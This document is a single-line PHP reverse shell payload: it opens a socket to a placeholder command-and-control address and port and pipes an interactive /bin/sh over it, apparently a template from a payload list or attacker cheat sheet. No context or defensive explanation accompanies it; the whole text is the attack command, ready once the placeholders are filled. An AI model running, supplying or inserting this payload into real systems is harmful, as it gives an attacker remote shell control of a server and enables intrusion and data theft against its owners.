php -r '$sock=fsockopen("XX_CC_SERVER_IP",XX_PORT);passthru("/bin/sh -i <&3 >&3 2>&3");'
